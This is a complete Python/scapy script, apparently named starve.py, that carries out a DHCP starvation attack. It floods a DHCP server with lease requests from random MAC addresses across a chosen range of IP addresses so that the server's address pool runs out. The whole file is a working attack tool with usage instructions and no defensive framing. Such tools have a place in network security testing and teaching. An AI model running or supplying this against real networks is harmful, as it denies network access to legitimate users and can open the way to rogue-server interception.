#!/usr/bin/python3
from scapy.all import *
import sys
import time
import getopt


def main(argv):
    conf.checkIPaddr = False   
    brmac = 'ff:ff:ff:ff:ff:ff'
    network = "192.168.1."
    serverid = "192.168.1.1"
    begin = 1
    end = 7
    
    try:
       opts, args = getopt.getopt(argv,"hn:s:b:e:")
    except getopt.GetoptError:
        print(" -n <network addres like 192.168.1.> \n -s <ip address of dhcp-server> \n -b <starting range to ask for lease> \n -e <end of range for asking leases> \n starve.py -n 192.168.1. -s 192.168.1.1 -b 20 -e 250")
        sys.exit(2)
    for opt, arg in opts:
        if opt == "-h":
            print(" -n <network addres like 192.168.1.> \n -s <ip address of dhcp-server> \n -b <starting range to ask for lease> \n -e <end of range for asking leases> \n starve.py -n 192.168.1. -s 192.168.1.1 -b 20 -e 250")
            sys.exit()
        elif opt in ("-n"):
            network = arg
        elif opt in ("-s"):
            serverid = arg
        elif opt in ("-b"):
            begin = arg
        elif opt in ("-e"):  
            end = arg
    for ip in range(int(begin), int(end)):
        adr = RandMAC()
        sendp(Ether(src=adr, dst=brmac)/IP(src='0.0.0.0', dst='255.255.255.255')/UDP(sport=68, dport=67)/BOOTP(chaddr=adr)/DHCP(options=[('message-type', 'request'),("server_id",str(serverid)), ("requested_addr",str(network) + str(ip)), 'end']))
        print("requesting ip " + str(network) + str(ip))
        time.sleep(3)
    
    

if __name__ == "__main__":
   main(sys.argv[1:])
